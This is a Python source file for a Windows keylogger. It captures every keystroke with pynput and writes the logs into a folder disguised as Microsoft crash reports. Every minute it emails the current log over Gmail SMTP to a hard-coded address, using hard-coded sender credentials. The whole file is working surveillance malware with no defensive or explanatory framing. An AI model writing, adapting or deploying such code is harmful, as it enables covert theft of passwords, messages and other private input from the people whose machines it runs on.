import time as t
import threading
import os
from os.path import basename
import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
import pathlib

try:
    import pynput.keyboard as Keyboard
except:
    os.system("py -m pip install pynput")
    os.system("python -m pip install pynput")
    import pynput.keyboard as Keyboard

dir_path = "C:\Microsoft\Windows\Logs\CrashReports"

try:
    pathlib.Path(dir_path).mkdir(parents=True, exist_ok=True)
except:
    dir_path = ""

file_path = ""
caps_lock = False


def file_creation():
    t.sleep(5)
    global file_path
    while True:
        x = datetime.now().strftime("%d-%m-%y %H-%M-%S")
        file_path = f"{dir_path}\log{x}.txt"
        print(file_path)

        try:
            f = open(file_path, 'w')
            f.write(f"INITALISED AT {x}\n")
            f.close()
        except:
            pass

        t.sleep(120)


def keylogging(key):
    global file_path
    global caps_lock

    try:
        f = open(file_path, 'a')
        if caps_lock:
            f.write(key.char.upper())
        else:
            f.write(key.char.lower())
        f.close()

    except AttributeError:
        if str(key) == "Key.space":
            f = open(file_path, 'a')
            f.write(" ")
            f.close()
        elif str(key) == "Key.enter":
            f = open(file_path, 'a')
            f.write("\n")
            f.close()
        elif str(key) == "Key.caps_lock":
            caps_lock = not caps_lock


def mailing(mail, password, receiver):
    t.sleep(15)
    while True:
        global file_path
        msg = MIMEMultipart()
        msg['Subject'] = file_path
        msg['From'] = mail
        msg['To'] = password
        msg.attach(MIMEText("Hello"))

        with open(file_path, "rb") as file:
            part = MIMEApplication(
                file.read(),
                Name=basename(file_path)
            )
        part['Content-Disposition'] = 'attachment; filename="%s"' % basename(
            file_path)
        msg.attach(part)

        # Sending Mail
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(mail, password)
        s.sendmail(mail, receiver, msg.as_string())
        s.quit()
        print("Mail Sent")

        t.sleep(60)


file_thread = threading.Thread(target=file_creation)
file_thread.name = "File Thread"
file_thread.start()

mail_thread = threading.Thread(target=mailing, args=(
    "mytestmail1101@gmail.com", "test@1101", "mytestmail1101@protonmail.com"))
mail_thread.name = "Mail Thread"
mail_thread.start()

with Keyboard.Listener(on_press=keylogging) as listener:
    listener.join()
